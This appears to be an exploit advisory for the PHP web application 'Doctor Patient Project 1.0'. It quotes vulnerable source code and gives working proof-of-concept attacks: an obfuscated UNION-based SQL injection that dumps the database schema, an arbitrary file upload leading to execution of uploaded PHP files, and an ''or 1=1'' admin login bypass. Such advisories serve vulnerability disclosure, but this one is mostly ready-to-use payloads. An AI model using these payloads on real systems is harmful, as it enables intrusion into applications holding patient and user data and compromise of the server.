@@ -1,0 +1,71 @@
+# # # # #
+# Exploit Title: Doctor Patient Project 1.0 - Multiple Vulnerabilities
+# Dork: N/A
+# Date: 17.08.2017
+# Vendor Homepage : http://surajkumar.in/
+# Software Link: http://surajkumar.in/product/doctor-patient-project-php/
+# Demo: http://surajkumar.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands...
+# The vulnerability allows an attacker to access the administration panel...
+# The vulnerability allows an paitent and doctors users upload arbitrary file...
+# 
+# Vulnerable Source:
+# # # # #
+# <?php
+# ....1
+# if(isset($_GET['docID']) && isset($_GET['docname'])){
+# $docID=$_GET['docID'];
+# $docname=$_GET['docname'];
+# $docData=docData($docID);
+# ...
+# function docData($docID){
+# $res=array();
+# $query=mysql_query("SELECT * FROM ".USERS.",".DOC." WHERE ".DOC.".doc_id='$docID' AND ".USERS.".id=".DOC.".doc_id");
+# if(mysql_num_rows($query)>0){
+#  	
+# ....2
+# $data['_filename']=$_FILES['_docImage']['name'];
+# $data['_filetmp']=$_FILES['_docImage']['tmp_name'];
+# $data['_folder']='doc_images';
+# 
+# ....3
+# if(isset($_POST['signin'])){
+# $data=array();
+# $data['user']=$_POST['user'];
+# $data['pass']=$_POST['pass'];
+# $res=adminLogin($data);
+# if($res['bool']==true){
+# ....
+# ?>
+# # # # #
+# 	
+# Proof of Concept:
+# 
+# 1:
+# http://localhost/[PATH]/single.php?docID=[SQL]
+# -1'+/*!22222UnIoN*/(/*!22222SeLeCT*/+0x283129,(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),/*!11111Concat*/(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x),0x283329,0x283429,0x283529,0x283629,0x283729,0x283829,0x283929,0x28313029,0x28313129,0x28313229,0x28313329,0x28313429,0x28313529)--+-&docname=0x30783330
+# 
+# 2/1:
+# http://localhost/[PATH]/patient/profile.php
+# http://localhost/[PATH]/patient/pat_images/[FILE].php
+# 
+# 2/2:
+# http://localhost/[PATH]/doctor/profile.php
+# http://localhost/[PATH]/doctor/doc_images/[FILE].php
+# 
+# 3:
+# http://localhost/[PATH]/admin
+# User: 'or 1=1 or ''=' Pass: 'or 1=1 or ''='
+# 
+# Etc...
+# # # # #
